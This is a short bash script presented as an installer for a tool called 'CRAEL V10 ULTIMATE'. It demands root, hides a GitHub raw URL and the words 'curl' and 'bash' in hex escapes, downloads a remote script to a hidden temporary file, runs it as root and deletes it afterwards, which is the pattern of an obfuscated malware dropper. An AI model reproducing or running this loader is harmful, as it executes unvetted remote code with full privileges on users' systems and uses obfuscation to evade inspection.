#!/bin/bash

exec < /dev/tty

# --- 2. THE HIDDEN KEY ---
_k=$(printf "\x52\x45\x53\x54\x52\x49\x43\x54\x45\x44\x5f\x41\x43\x43\x45\x53\x53\x5f\x56\x49\x4f\x4c\x41\x54\x49\x4f\x4e\x5f\x44\x45\x54\x45\x43\x54\x45\x44")

# --- 3. THE PAYLOAD (OBFUSCATED) ---
# Target: https://raw.githubusercontent.com/plumsoftwaredev-bit/loppp/main/Proxo.sh
_h="0x680x740x740x700x730x3a0x2f0x2f0x720x610x770x2e0x670x690x740x680x750x620x750x730x650x720x630x6f0x6e0x740x650x6e0x740x2e0x630x6f0x6d0x2f0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2d0x620x690x740x2f0x6c0x6f0x700x700x700x2f0x6d0x610x690x6e0x2f0x500x720x6f0x780x6f0x2e0x730x68"

# --- 4. UI HEX BLOCKS ---
_m=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x32\x31\x33\x6d")
_r=$(printf "\x1b\x5b\x30\x6d")
_t1="   CRAEL V10 ULTIMATE"
_t2="   Powered by Nayeem Dev"

# --- 5. ROOT CHECK ---
if [ "$EUID" -ne 0 ]; then
    echo "Error: Please run as root (sudo)."
    exit 1
fi

# --- 6. DECODER ENGINE ---
function _d() {
    local _v=$1
    echo "$_v" | awk '{gsub("0x","\\\\x"); print}' | xargs -0 printf
}

# --- 7. EXECUTION FLOW ---
clear
echo -e "${_m}${_t1}"
echo -e "${_t2}${_r}"

_u=$(_d "$_h")
_t="/tmp/.crael_setup_$(date +%s)"
_c=$(printf "\x63\x75\x72\x6c") # curl
_b=$(printf "\x62\x61\x73\x68") # bash
_f=$(printf "\x2d\x73\x4c")     # -sL

# Integrity & Execution
if [[ "$_k" == *"RESTRICTED"* ]]; then
    # Download Proxo to temp
    ${_c} ${_f} "$_u" -o "$_t"
    
    if [ -s "$_t" ]; then
        chmod +x "$_t"
        # Run Proxo (It will handle the binary download)
        ${_b} "$_t"
        
        # Cleanup
        rm -f "$_t"
    else
        echo "Error: Connection Failed."
        exit 1
    fi
else
    exit 1
fi
